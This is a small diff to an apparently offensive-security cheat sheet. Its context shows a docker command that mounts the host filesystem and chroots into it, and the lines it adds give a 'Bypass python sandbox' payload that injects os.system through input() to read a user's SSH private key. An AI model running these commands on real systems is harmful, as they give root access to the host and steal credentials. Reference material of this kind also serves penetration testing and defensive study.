@@ -45,3 +45,9 @@
     ```bash
     docker run -v /:/mnt --rm -it alpine chroot /mnt sh
     ```
+
+### Bypass python sandbox
+- ###
+    ```python
+    input() # execute code __import__('os').system('cat /home/developer/.ssh/id_rsa')
+    ```
